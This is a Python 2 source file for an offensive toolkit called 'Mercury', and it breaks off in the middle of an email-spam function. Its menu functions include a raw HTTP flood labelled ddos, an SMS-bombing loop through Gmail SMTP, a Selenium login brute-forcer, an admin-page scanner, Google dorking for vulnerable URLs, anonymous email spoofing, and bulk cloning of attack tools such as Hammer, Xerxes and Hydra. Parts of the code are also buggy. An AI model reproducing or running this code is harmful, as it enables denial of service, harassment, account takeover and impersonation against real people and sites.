# coding: utf-8
#!/usr/bin/env python
'''

inspired by fsociety and Trity
'''



#Modules
import os, sys,time
try:
	import re
	import json
	import wget
	import socket
	import urllib
	import urllib2
	import smtplib
	import random
	import hashlib
	import requests
	import platform
	import mechanize
	import subprocess
	from six.moves import urllib
	from selenium import webdriver
	from colorama import init, Fore, Back, Style
	from pygoogling.googling import GoogleSearch
	from urllib2 import Request, urlopen, URLError, HTTPError
except ImportError: #If you dont have the required modules this error will help install them for you
	print ('\033[4m Do you have all of the needed Modules ?')
	time.sleep(1)
	yn = raw_input('Would You Like To Install Them Now? y/n: ')
	if yn == 'n': 
		pass
	if yn == 'y':
		os.system('pip install selenium')
		os.system('pip install colorama')
		os.system('pip install requests')
		os.system('pip install urllib2')
		os.system('pip install os')
		os.system('pip install urllib')
		os.system('pip install pygoogling')
		os.system('pip install hashlib')
		os.system('pip install smtplib')
		os.system('pip install mechanize')
		os.system('pip install subprocess')
		os.system('pip install pygoogling')

	'''
	Allows the program to find the build  

	'''
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
M = '\033[1;35;32m' # magenta
x = os.path.dirname(os.path.abspath(__file__))
init(convert=True)
ip = socket.gethostbyname(socket.gethostname())
results = subprocess.check_output(["netsh", "wlan", "show", "network"])

termsAndConditions = Fore.RED + '''\033[4m Don`t Use Mercury To:
create and share malicious viruses, illegally harm others computers, 
interrupt wifi / bluetooth signals without permission, violate security, 
and violate privacy

'''
#terms and condtions 
            
def extra_long():
	time.sleep(10) #Pause == 4 Secs
def long():
	time.sleep(5) #Pause == 3 Secs
def quick():
	time.sleep(2) #Pause == 2 Secs
def clear():
	os.system('clear')
	os.system('cls')
def space():
	print ' '
	print ' '	

def agreement():
 afile = open(x+'\Extra\Mercury.txt','r+')
 term = afile.readlines() # Creates a list of lines called term
 for line in term: #for lines in term
     print(line) #prints line
     if 'yes' in line: #if you agreed skip to main menu
         found = True
         clear()
         mainmenu()
     if ' ' in line: #if not load up terms
         found = False
         clear()
         print(termsAndConditions)
         agree = raw_input(Fore.YELLOW + 'Type "yes" To Agree: ')
         if agree == 'yes': #saves agree
             file = open(x+'\Extra\Mercury.txt','w')
             afile.write('yes')
             file.close()
             afile.close()
             mainmenu()
         else:
        	agreement()
def ddos():
	ip = raw_input(Fore.CYAN + 'Enter an ip address: ')
	bytess = 65500
	try:
		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, 80))
			s.send("GET /" + str(bytess) + " HTTP/1.1\r\n")
			s.send("Host: " + ip  + "\r\n\r\n")
			print (Fore.CYAN + 'Bytes Sent to %s') % ip
			s.close()
	except KeyboardInterrupt:
		mainmenu()
	except socket.gaierror:
		pass
		print (Fore.RED + 'Connection Couldnt be made!')
def dork1():
 	count = 0
 	while True:
 		try:
			google_search = GoogleSearch('inurl: id='+str(count))
			google_search.start_search(max_page=1)
			print(Fore.GREEN + google_search.search_result[count]) # will print the url as list of string
			print  (' ')
			count += 1
		except IndexError:
			pass
		except KeyboardInterrupt:
			mainmenu()



def sms():
	try:
		print Fore.CYAN + "Enter the provider ex: @vtext.com for Verizon" #@vtext.com #messaging.sprintpcs.com
	        provider = raw_input(Fore.CYAN + 'Enter provider: ' )
		phone_num = raw_input(Fore.CYAN + 'phone number to spam: ') + provider
		gmail = raw_input(Fore.CYAN + 'Your email: ')
		password = raw_input(Fore.CYAN + 'What is your email password? ' )
	        server = smtplib.SMTP("smtp.gmail.com",587)
	        server.starttls()
	        server.login(gmail, password)
		message = raw_input('Message: ')
	        spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(gmail, phone_num, message) #Trity
	        for i in range(times):
	            server.sendmail(gmail, phone_num, spam_msg)
	        time.sleep(0.1)
		print ( Fore.GREEN + 'Successfully sent! ')
		long()
		mainmenu()
	except KeyboardInterrupt:
		mainmenu()		  
def readme():
	clear()
	readme = open(x+'\README.md','r') #opens file
	license = open(x+'\License', 'r') #opens file
	file_contents = readme.read() #reads file
	file_contents2 = license.read() #reads file
	print (file_contents) #prints ReadMe
	space()
	extra_long()
	clear()
	print (file_contents2) #print License
	extra_long()
	readme.close()
	license.cose()
	mainmenu()
def sub_link():
	url = raw_input(Fore.CYAN + 'Enter an url: ')
	website = urllib2.urlopen(url)
	html = website.read()
	links = re.findall('"((http|ftp)s?://.*?)"', html)
	space()
	count = 0
	try:
		for x in links:
			website_sub = x[0]
			print (Fore.GREEN + website_sub)
			website = urllib2.urlopen(x[count])
	except urllib2.HTTPError:
		pass

	extra_long()
	mainmenu()

def update():
	clear()
	quick()
	os.system('git clone https://github.com/MetaChar/Mercury'+x+'\Update') #Just redownloads the repo
	sys.exit()
def twitter():
	print (Fore.CYAN + '	Exclude the @ sign! ')
	user = raw_input('		Enter a Twitter handle: ')
	options = webdriver.ChromeOptions()
	options.add_argument("--disable-popup-blocking")
	options.add_argument("--ignore-certificate-errors")
	options.add_argument("--disable-extensions")
	options.add_argument('headless')
	options.add_argument("test-type")
	options.add_argument('--hide-scrollbars')
	options.add_argument('--disable-gpu')
	surf = webdriver.Chrome(chrome_options=options) # change to 'Firefox' if running firefox
	base_url = 'https://twitter.com/'
	target = base_url+user
	surf.get(target)
	try:
		followers = surf.find_element_by_css_selector('#page-container > div.ProfileCanopy.ProfileCanopy--withNav.ProfileCanopy--large.js-variableHeightTopBar > div > div.ProfileCanopy-navBar.u-boxShadow > div > div > div.Grid-cell.u-size2of3.u-lg-size3of4 > div > div > ul > li.ProfileNav-item.ProfileNav-item--followers > a > span.ProfileNav-value')
		tweets = surf.find_element_by_css_selector('#page-container > div.ProfileCanopy.ProfileCanopy--withNav.ProfileCanopy--large.js-variableHeightTopBar > div > div.ProfileCanopy-navBar.u-boxShadow > div > div > div.Grid-cell.u-size2of3.u-lg-size3of4 > div > div > ul > li.ProfileNav-item.ProfileNav-item--tweets.is-active > a > span.ProfileNav-value')
		date_joined = surf.find_element_by_css_selector('#page-container > div.AppContainer > div > div > div.Grid-cell.u-size1of3.u-lg-size1of4 > div > div > div > div.ProfileHeaderCard > div.ProfileHeaderCard-joinDate > span.ProfileHeaderCard-joinDateText.js-tooltip.u-dir') #Finds Selector
		location = surf.find_element_by_css_selector('#page-container > div.AppContainer > div > div > div.Grid-cell.u-size1of3.u-lg-size1of4 > div > div > div > div.ProfileHeaderCard > div.ProfileHeaderCard-location > span.ProfileHeaderCard-locationText.u-dir')
		likes = surf.find_element_by_css_selector('#page-container > div.ProfileCanopy.ProfileCanopy--withNav.ProfileCanopy--large.js-variableHeightTopBar > div > div.ProfileCanopy-navBar.u-boxShadow > div > div > div.Grid-cell.u-size2of3.u-lg-size3of4 > div > div > ul > li.ProfileNav-item.ProfileNav-item--favorites > a > span.ProfileNav-value')
		print (Fore.GREEN + date_joined.text)
		print (Fore.GREEN + 'Location: ' + location.text)
		print (Fore.YELLOW + 'Followers: ' + followers.text)
		print (Fore.YELLOW + 'Tweets: '+ tweets.text)
		print (Fore.YELLOW + 'Likes: '+likes.text)
		long()
		mainmenu()
	except:
		mainmenu()

def websitess():
	global browser
	global attempt
	if attempt == 0:
		options = webdriver.ChromeOptions()
		options.add_argument("--disable-popup-blocking")
		options.add_argument("--ignore-certificate-errors")
		options.add_argument("--disable-extensions")
		options.add_argument("disable-infobars")
		options.add_argument("test-type")
		options.add_argument('--hide-scrollbars')
		options.add_argument('--disable-gpu')
		browser = webdriver.Chrome(chrome_options=options) # change to 'Firefox' if running firefox
	if attempt > 0:
		pass
	clear()
	print (Fore.WHITE + color.BOLD +''' /$$       /$$           /$$                      
| $$      |__/          | $$                      
| $$       /$$ /$$$$$$$ | $$   /$$  /$$$$$$$      
| $$      | $$| $$__  $$| $$  /$$/ /$$_____/      
  \033[96m| $$      | $$| $$  \ $$| $$$$$$/ |  $$$$$$       
| $$      | $$| $$  | $$| $$_  $$  \____  $$      
| $$$$$$$$| $$| $$  | $$| $$ \  $$ /$$$$$$$/      
|________/|__/|__/  |__/|__/  \__/|_______/       
		                                                  
		                                                  
		                                                  ''')
	space()
	print (Fore.WHITE + '''
	[0]\033[96m Hack5\033[1;37;40m		[9]\033[96m Reddit\033[1;37;40m
	[1]\033[96m Github \033[1;37;40m		[10]\033[96m Google\033[1;37;40m
	[2]\033[96m HackThisSite \033[1;37;40m       [11]\033[96m DarkNet\033[1;37;40m
	[3]\033[96m Dark More Ops \033[1;37;40m	[12]\033[96m Stack Overflow \033[1;37;40m
	[4]\033[96m Kali Linux \033[1;37;40m         [13]\033[96m Arduino\033[1;37;40m
	[5]\033[96m Defcon \033[1;37;40m		[14]\033[96m RaspberryPie\033[1;37;40m
	[6]\033[96m Pycon \033[1;37;40m              [15]\033[96m Kitploit\033[1;37;40m
	[7]\033[96m Python.org \033[1;37;40m         [16]\033[96m Hack A Day\033[1;37;40m
	[8]\033[96m HackThis! \033[1;37;40m


	[99]\033[96m Exit submenu\033[1;37;40m
										            ''')
	ans_5 = raw_input('Links ~# ')
	attempt += 1
	if ans_5 == '0':
		browser.get('https://www.hak5.org/')
		websitess()
	if ans_5 == '1':
		browser.get('https://github.com/')
		websitess()
	if ans_5 == '2':
		browser.get('https://www.hackthissite.org/')
		websitess()
	if ans_5 == '3':
		browser.get('https://www.darkmoreops.com/')
		websitess()
	if ans_5 == '4':
		browser.get('https://docs.kali.org/category/introduction')
		websitess()
	if ans_5 == '5':
		browser.get('https://www.defcon.org/')
		websitess()
	if ans_5 == '6':
		browser.get('https://us.pycon.org/2018/')
		websitess()
	if ans_5 == '7':
		browser.get('https://www.python.org/')
		websitess()
	if ans_5 == '8':
		browser.get('https://www.hackthis.co.uk/')
		websitess()
	if ans_5 == '9':
		browser.get('https://www.reddit.com/')
		websitess()
	if ans_5 == '10':
		browser.get('https://www.google.com/')
		websitess()
	if ans_5 == '11':
		browser.get('https://www.darknet.org.uk/')
		websitess()
	if ans_5 == '12':
		browser.get('https://stackoverflow.com/')
		websitess()
	if ans_5 == '13':
		browser.get('https://www.arduino.cc/')
		websitess()
	if ans_5 == '14':
		browser.get('https://www.raspberrypi.org/')
		websitess()
	if ans_5 == '15':
		browser.get('https://www.kitploit.com/')
		websitess()
	if ans_5 == '16':
		browser.get('https://hackaday.com/')
		websitess()
	if ans_5 == '99':
		attempt = 0 
		mainmenu()
	else:
		websitess()
def toolss():
	clear()
	print (Fore.WHITE +  color.BOLD + ''' /$$$$$$$$                  /$$                       /$$      
|__  $$__/                 | $$                      /$$/      
   | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$           /$$/       
   | $$ /$$__  $$ /$$__  $$| $$ /$$_____/          /$$/        
   | $$| $$  \ $$| $$  \ $$| $$|  $$$$$$          /$$/         
   \033[96m| $$| $$  | $$| $$  | $$| $$ \____  $$        /$$/          
   | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/       /$$/           
   |__/ \______/  \______/ |__/|_______/       |__/            
                                                               
                                                               
                                                               
                                           ''')
	space()
	print (Fore.WHITE + '''
	[0]\033[96m Metasploit\033[1;37;40m		[9]\033[96m Aircrack\033[1;37;40m
	[1]\033[96m Mercury \033[1;37;40m		[10]\033[96m Wifite\033[1;37;40m
	[2]\033[96m Nmap \033[1;37;40m      		[11]\033[96m Hammer\033[1;37;40m
	[3]\033[96m Lazy script \033[1;37;40m	[12]\033[96m Xerxes\033[1;37;40m
	[4]\033[96m fsociety \033[1;37;40m		[13]\033[96m XSStrike\033[1;37;40m
	[5]\033[96m Reaver \033[1;37;40m		[14]\033[96m Wpscan\033[1;37;40m
	[6]\033[96m InstaBrute \033[1;37;40m 	[15]\033[96m Cupp\033[1;37;40m
	[7]\033[96m Cl0neMas3r \033[1;37;40m 	[16]\033[96m Hydra\033[1;37;40m
	[8]\033[96m Sqlmap \033[1;37;40m		


	[100]\033[96m Install All\033[1;37;40m	[99]\033[96m Exit submenu\033[1;37;40m
								      
		                        ''')
	ans_2 = raw_input('Tools ~# ')
	if ans_2 == '0':
		try:
			os.system('git clone https://github.com/rapid7/metasploit-framework '+x+'/Tools/Metasploit')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '1':
		try:
			os.system('git clone https://github.com/MetaChar/Mercury '+x+'/Tools/Mercury')
			toolss()
		except KeyboardInterrupt:
			toolss()	
	if ans_2 == '2':
		try:
			os.system('git clone https://github.com/nmap/nmap '+x+'/Tools/Nmap')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '3':
		try:
			os.system('git clone https://github.com/arismelachroinos/lscript '+x+'/Tools/LazyScript')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '4':
		try:
			os.system('git clone https://github.com/Manisso/fsociety '+x+'/Tools/Fsociety')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '5':
		try:
			os.system('git clone https://github.com/t6x/reaver-wps-fork-t6x '+x+'/Tools/Reaver')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '6':
		try:
			os.system('git clone https://github.com/N3TC4T/InstaBrute '+x+'/InstaBrute')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '7':
		try:
			os.system('git clone https://github.com/Abdulraheem30042/Cl0neMast3r '+x+'/Tools/CloneMaster')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '8':
		try:
			os.system('git clone https://github.com/sqlmapproject/sqlmap '+x+'/Tools/Sqlmap')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '9':
		try:
			os.system('git clone https://github.com/aircrack-ng/aircrack-ng '+x+'/Tools/aircrack-ng')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '10':
		try:
			os.system('git clone  https://github.com/derv82/wifite '+x+'/Tools/wifite')
			toolss()
		except KeyboardInterrupt:
			toolss()

	if ans_2 == '11':
		try:
			os.system('git clone https://github.com/cyweb/hammer '+x+'/Tools/hammer')
			toolss()
		except KeyboardInterrupt:
			toolss()

	if ans_2 == '12':
		try:
			os.system('git clone https://github.com/zanyarjamal/xerxes '+x+'/Tools/xerxes')
			toolss()
		except KeyboardInterrupt:
			toolss()

	if ans_2 == '13':
		try:
			os.system('git clone https://github.com/UltimateHackers/XSStrike '+x+'/Tools/XSStrike')
			toolss()
		except KeyboardInterrupt:
			toolss()

	if ans_2 == '14':
		try:
			os.system('git clone https://github.com/wpscanteam/wpscan '+x+'/Tools/wpscan')
			toolss()
		except KeyboardInterrupt:
			toolss()

	if ans_2 == '15':
		try:
			os.system('git clone https://github.com/Mebus/cupp '+x+'/Tools/cupp')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '16':
		try:
			os.system('git clone https://github.com/vanhauser-thc/thc-hydra '+x+'/Tools/thc-hydra')
			toolss()
		except KeyboardInterrupt:
			toolss()
	if ans_2 == '17':
		try:
			os.system('git clone https://github.com/bettercap/bettercap '+x+'/Tools/BetterCap')
			toolss()
		except KeyboardInterrupt:
			toolss()

	if ans_2 == '100':
		try:
			os.system('git clone https://github.com/vanhauser-thc/thc-hydra '+x+'/Tools/thc-hydra')
			os.system('git clone https://github.com/Mebus/cupp '+x+'/Tools/cupp ')
			os.system('git clone https://github.com/wpscanteam/wpscan '+x+'/Tools/wpscan')
			os.system('git clone https://github.com/UltimateHackers/XSStrike '+x+'/Tools/XSStrike')
			os.system('git clone https://github.com/zanyarjamal/xerxes '+x+'/Tools/xerxes')
			os.system('git clone https://github.com/cyweb/hammer '+x+'/Tools/hammer')
			os.system('git clone  https://github.com/derv82/wifite '+x+'/Tools/wifite')
			os.system('git clone https://github.com/aircrack-ng/aircrack-ng '+x+'/Tools/aircrack-ng')
			os.system('git clone https://github.com/sqlmapproject/sqlmap '+x+'/Tools/Sqlmap')
			os.system('git clone https://github.com/Abdulraheem30042/Cl0neMast3r '+x+'/Tools/CloneMaster')
			os.system('git clone https://github.com/N3TC4T/InstaBrute '+x+'/Tools/InstaBrute')
			os.system('git clone https://github.com/t6x/reaver-wps-fork-t6x '+x+'/Tools/Reaver')
			os.system('git clone https://github.com/Manisso/fsociety '+x+'/Tools/Fsociety')
			os.system('git clone https://github.com/arismelachroinos/lscript '+x+'/Tools/LazyScript')
			os.system('git clone https://github.com/nmap/nmap '+x+'/Tools/Nmap')
			os.system('git clone https://github.com/MetaChar/Mercury '+x+'/Tools/Mercury')
			os.system('git clone https://github.com/rapid7/metasploit-framework '+x+'/Tools/Metasploit')

			toolss()
		except KeyboardInterrupt: #returns to main menu if ctrl C is used
			toolss()

	if ans_2 == '99':
		mainmenu()
	else:
		toolss()
def proxys():
	options = webdriver.ChromeOptions()
	options.add_argument("--disable-popup-blocking")
	options.add_argument("--ignore-certificate-errors")
	options.add_argument("--disable-extensions")
	options.add_argument("disable-infobars")
	options.add_argument("headless")
	options.add_argument("test-type")
	options.add_argument('--hide-scrollbars')
	options.add_argument('--disable-gpu')
	browser = webdriver.Chrome(chrome_options=options) # change to 'Firefox' if running firefox
	prox_txt = open(x+'\Resources\proxys.txt', 'w')
	url = 'https://www.us-proxy.org'
	browser.get(url)
	try:
		proxys_num = 2
		while True:
			if proxys_num < 22:
				prox_even = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num)+') > td:nth-child(1)')
				port_even = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num)+') > td:nth-child(2)')
				last_checked = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num)+') > td:nth-child(8)')
				https = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num)+') > td:nth-child(7)')
				print (Fore.GREEN + prox_even.text + ' : ' + port_even.text + '  '+ last_checked.text + 'Https: '+ Fore.RED + https.text)
				print >>prox_txt, str(prox_even.text) + ':'+str(port_even.text) + '\n'
				proxys_num += 2
			if proxys_num == 22:
				global proxys_num2
				next_page = browser.find_element_by_css_selector('li.fg-button:nth-child(4) > a:nth-child(1)').click()
				next_page
				prox_even = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num2)+') > td:nth-child(1)')
				port_even = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num2)+') > td:nth-child(2)')
				last_checked = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num2)+') > td:nth-child(8)')
				https = browser.find_element_by_css_selector('tr.even:nth-child('+str(proxys_num2)+') > td:nth-child(7)')
				print (Fore.GREEN + prox_even.text + ' : ' + port_even.text + '  '+ last_checked.text + 'Https: '+ Fore.RED + https.text)
				print >>prox_txt, str(prox_even.text) + ':'+str(port_even.text)  + '\n'
				proxys_num2 += 2
			if proxys_num2 == 40:
				extra_long()
				print (Fore.RED + 'Saved Under Resources')
				prox_txt.close()
	except NameError:
		extra_long()
		mainmenu()
	except IOError:
		mainmenu()
	except KeyboardInterrupt:
		mainmenu()
	except:
		extra_long()
		mainmenu()

def sourcecode():
	try:
		name = raw_input(Fore.CYAN + 'Enter the file name: ') #Save File
		file = name+'.html'
		URL1=raw_input(Fore.CYAN + 'Enter An Url ') #Url
		html1 = open(file, 'a+') #Writes The File
		html = open(file, 'w')
		response = urllib2.urlopen(URL1) #Opens Url
		page_source = response.read() #Reads URL
		space()
		print >>html,  page_source #Change to python3 Syntax
		print ('Done ! saved under "Users" ')
		quick()
		clear()
		html.close()
		html1.close()		
		mainmenu()
	except KeyboardInterrupt:
		print ('Stopped! ')
		html.close()
		html1.close()
		mainmenu()
	except IOError:
		print ('File was not found \: ')
		html.close()
		html1.close()
		mainmenu()
def siteexists():
    try:
        site = raw_input(Fore.CYAN + 'Enter a website: ')
        urllib2.urlopen(site)
    except urllib2.HTTPError, e:
        print (Fore.RED + site  + ' Does not exist')
        print(e.code)
        quick()
        mainmenu()
    except urllib2.URLError, e:
        print (Fore.RED + site + ' Does not exist')
        quick()
        mainmenu()
    except KeyboardInterrupt:
      mainmenu()
    except ValueError:
    	print (Fore.RED + 'Unknown url type / invalid url')
    	quick()
    	mainmenu()
    else:
        	print ('%s Exists ') % site
        	long()
        	mainmenu()
def brute_force(): #Declares Function
	f = open(x+'\Resources\passwords.txt', 'r')
	options = webdriver.ChromeOptions()
	options.add_argument("--disable-popup-blocking")
	options.add_argument("--ignore-certificate-errors")
	options.add_argument("--disable-extensions")
	options.add_argument("disable-infobars")
	options.add_argument("test-type")
	options.add_argument('--hide-scrollbars')
	options.add_argument('--disable-gpu')
	browser = webdriver.Chrome(chrome_options=options) #Opens Chrome
	username = raw_input(Fore.CYAN + '	What is the Username? ') #Username
	USS = raw_input('		What is the CSS Selector for the Username? ') #CSS Selector Username
	PSS = raw_input(' 			What is the CSS Selector for the Password? ') #CSS Selector Password
	SSS  = raw_input ('				What is the CSS Selector for the Submit Button? ') #CSS Selector Submit
	url4 = raw_input('					What is the Url? ') #URL Requests
	browser.get(url4)
	count = 1 #count
	while True:
		try:
			browser.get(url4)
			Sel_user = browser.find_element_by_css_selector(USS) #Finds Selector
			Sel_pas = browser.find_element_by_css_selector(PSS) #Finds Selector
			enter = browser.find_element_by_css_selector(SSS) #Finds Selector 
			quick() #Pause
			line = f.read(count) #Password Lines
			for line in f:
				Sel_user = browser.find_element_by_css_selector(USS) #Finds Selector
				Sel_pas = browser.find_element_by_css_selector(PSS) #Finds Selector
				enter = browser.find_element_by_css_selector(SSS) #Finds Selector 
				Sel_user.send_keys(username) #Sends Username
				quick()
				Sel_pas.send_keys(line) #Sends Password
				enter = browser.find_element_by_css_selector(SSS).click() #Clicks Enter
				space()
				print (Fore.CYAN + '#-----------------------------#')
				print (Fore.WHITE + 'Tried Password: ' +line+ 'For User:' +username) #Displays Data
				print (Fore.CYAN +'# ----------------------------#')
				count =+ 1 #Counts +1
		except IOError: #unknown error by me 
			print ('There was a random error sorry! ')
			quick()
			mainmenu()
			f.close()
		except KeyboardInterrupt: #returns to main menu if ctrl C is used
			f.close()
			mainmenu()
		except:
			print ('Url not found or selector not found.')
			long()
			mainmenu()
def admin():
	links = open(x+'\Resources\links.txt')
	website = raw_input(Fore.CYAN + 'Enter a site to scan just www: ')
	type_link = raw_input('Is the link https or http: ')
	count4 = 1
	while True:
		try:
			sub_link = links.readline(count4)
			website2 = type_link+'://'+website+'/'+ sub_link
			req = Request(website2)
	    		response = urlopen(req)
		except HTTPError as e:
			print(Fore.RED  + website2) 
			count4 += 1
		except URLError as e:
    			print(Fore.RED + website2) 
    			count4 += 1
    		except  KeyboardInterrupt:
    			mainmenu()
    			links.close()
		else:
   			print(Fore.GREEN + website2) 
   			count4 += 1
def hash():

	try:
		oghash = raw_input(Fore.CYAN + "\t Please Enter a Word/String To Hash: ") #asks for word
		md5_encode = hashlib.md5(oghash.encode()) #encodes string
		newhash = md5_encode.hexdigest() #saves as var
		print(Fore.CYAN + "\t" + newhash) #prints var
		long()

	except KeyboardInterrupt:
		pass
	except:
		print(Fore.CYAN + "\tCould not find hash {}".format(oghash)) #no hash found
		quick()
def pip_installep(): #change to p so it could by loaded in prompt
	try:
		pip = raw_input(Fore.CYAN + '	What Pip would you like to install: ')
		os.system('pip install ' +pip)
		time.sleep(1)
		clear()
		prompt()
	except KeyboardInterrupt:
		print ('Stopped! ')
		quick()
		prompt()
def hex():
	choice = raw_input(Fore.CYAN + 'Would you like to (e)ncode or (d)ecode? ')
	if choice == 'e':
		encode1()
	if choice == 'd':
		decode1() 
def encode1():
	Str = raw_input(Fore.CYAN + 'String to encode: ')
	Str = Str.encode('hex','strict');
	print "Encoded: %s"  % Str
	long()
	mainmenu()
def decode1():
    Str = raw_input(Fore.CYAN + 'String to decode: ' )
    Str = Str.decode('hex','strict');
    print "Decoded String: %s" % Str
    long()
    mainmenu()
def ipaddress():
	try:
		url2 = raw_input(Fore.CYAN +"Enter a website url ") #User Input
		ip = socket.gethostbyname(url2) #Gets Ip Address
		print (Fore.CYAN + (ip)) #Prints Ip Address
		long()
		clear()
		mainmenu()
	except socket.gaierror:
		print (Fore.RED + 'Couldnt retrieve the ipaddress')
		quick()
		mainmenu()
	except KeyboardInterrupt:
		mainmenu()
	except AttributeError: #enter link like www.google.com rather than https://www.google.com
		print ('Dont include https or http in the site link !')
		quick()
		mainmenu()

def networksweb():
	url3 = raw_input(Fore.CYAN + 'Enter a host name include https: ')
	count3 = 1
	while True: #loop
			try:
				req = Request(url3)
	    			response = urlopen(req)
		    	except KeyboardInterrupt: #returns to main menu if ctrl C is used
				mainmenu() #mainmenu
			except HTTPError as e:
		    		status = "Not connected" #if you cant connect then:
		    		print (Fore.RED+'Attempt '+ Fore.RED +str( count3 )+ Fore.RED +  ' At Host: '+ Fore.RED +url3 + Fore.RED + ': OFFLINE')
				print (status)
			except HTTPError as e:
		    		status = "Not connected" #if you cant connect then:
		    		print (Fore.RED+'Attempt '+ Fore.RED +str( count3 )+ Fore.RED +  ' At Host: '+ Fore.RED +url3 + Fore.RED + ': OFFLINE')
				print (status)
			except urllib2.URLError:
		    		status = "Not connected" #if you cant connect then:
		    		print (Fore.RED+'Attempt '+ Fore.RED +str( count3 )+ Fore.RED +  ' At Host: '+ Fore.RED +url3 + Fore.RED + ': OFFLINE')
				print (status)
			except socket.error:
		    		status = "UKNOWN" #if you cant connect then:
		    		print (Fore.RED+'Attempt '+ Fore.RED +str( count3 )+ Fore.RED +  ' At Host: '+ Fore.RED +url3 + Fore.RED + ': Closed By Host')
				print (status)
			except ValueError:
				print (Fore.RED + 'Unknown url type/ Invalid url')
				quick()
				mainmenu()
			else:
				print (Fore.CYAN +'Attempt '+ Fore.CYAN +str( count3 )+ Fore.CYAN +  ' at host: '+ Fore.CYAN +url3 + Fore.GREEN + ': online')
				count3 += 1
def webbrowserfunc():
	print (Fore.RED + 'Ex: 123.78.65:80')
	PROXY = raw_input(Fore.CYAN + 'Enter a proxy: ')
	options = webdriver.ChromeOptions()
	options.add_argument("--disable-popup-blocking")
	options.add_argument("--ignore-certificate-errors")
	options.add_argument("--disable-extensions")
	options.add_argument("disable-infobars")
	options.add_argument("test-type")
	options.add_argument('--hide-scrollbars')
	options.add_argument('--disable-gpu')
	options.add_experimental_option("prefs", {"profile.default_content_settings.cookies": 2})
	options.add_argument('--proxy-server=%s' % PROXY)
	anonbrowser = webdriver.Chrome(chrome_options=options)
	anonbrowser.get('http://www.ip-adress.eu/')

def mac():
	try:
		os.system('getmac') #For Linux Change to ifconfig -a
		long()
		mainmenu()
	except KeyboardInterrupt:
		mainmenu()
def myip():
	print (	'	Your ip is ' + Fore.CYAN + socket.gethostbyname(socket.gethostname())) #gets ip address from socket linux always returns 12.0.0.1
	long()
	mainmenu()
def pip_installer():
	try:
		pip = raw_input(Fore.CYAN + '	What Pip would you like to install: ') #what pip 
		os.system('pip install ' +pip) #installs pip
		time.sleep(1)
		clear()
		mainmenu()
	except KeyboardInterrupt: 
		print ('Stopped! ')
		quick()
		mainmenu()
def github():
	githublink = raw_input(Fore.CYAN + '	Enter an url to the GitHub repo: ')
	name = raw_input('		What is the name of the repo? ')
	try:
		os.system('git clone '+githublink+ ' '+x+'/'+name) #save file to Mercury/'name'
		time.sleep(1)
		long()
		clear()
		mainmenu()
	except KeyboardInterrupt:
		print ('Stopped! ')
		quick()
		mainmenu()
	else:
		print ('Fatal error ')
		mainmenu()
def exit():
	sys.exit()
def geoLocationp(): 
	try:
		target = raw_input(Fore.CYAN + '	Enter an ip address: ') #User Input
		send_url = 'http://freegeoip.net/json/'+target #Finds Targets
		r = requests.get(send_url) #Sends Url
		j = json.loads(r.text) #Reads All Text
		cn = j['country_name'] #Reads Country
		rc = j['region_code'] #Reads Region Code
		city = j['city'] #Reads City
		lat = j['latitude'] #Read Latitiude
		lon = j['longitude'] #Read Longitude
		print (lat)
		print  (lon)
		print (city)
		print (rc)
		print (cn)
		long() #Pause
		prompt()
	except KeyboardInterrupt:
		prompt()
def emailspoofsetup():
	br = mechanize.Browser()
	 
	to = raw_input(Fore.CYAN + "Enter the recipient address: ")
	subject = raw_input("Enter the subject: ")
	print "Message: "
	message = raw_input(">")
	 
	#proxy = "http://127.0.0.1:8080"
	 
	url = "http://anonymouse.org/anonemail.html"
	headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
	br.addheaders = [('User-agent', headers)]
	br.open(url)
	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.set_debug_http(False)
	br.set_debug_redirects(False)
	#br.set_proxies({"http": proxy})
	 
	br.select_form(nr=0)
	 
	br.form['to'] = to
	br.form['subject'] = subject
	br.form['text'] = message
	 
	result = br.submit()
	 
	response = br.response().read()
	 
	 
	if "The e-mail has been sent anonymously!" in response:
	    print "The email has been sent successfully!! \n The recipient will get it in 12 hours!!"
	    long()
	    mainmenu()
	else:
	    print "Failed to send email!"
	    long()
	    mainmenu()
def emailspam():
	try:
		sender = raw_input(Fore.CYAN + 'What is your gmail?  ')
		password = getpass('What is your gmail password?  ') #you need to login to send an email
		message = raw_input('What message do you want to send? ')
		reciever = raw_input('Who do you want to send this to? ')
		server = smtplib.SMTP('smtp.gmail.com', 587) #server
		server.ehlo() #starts server
		to = [sender, reciever]  
		subject = 'MetaChar'  
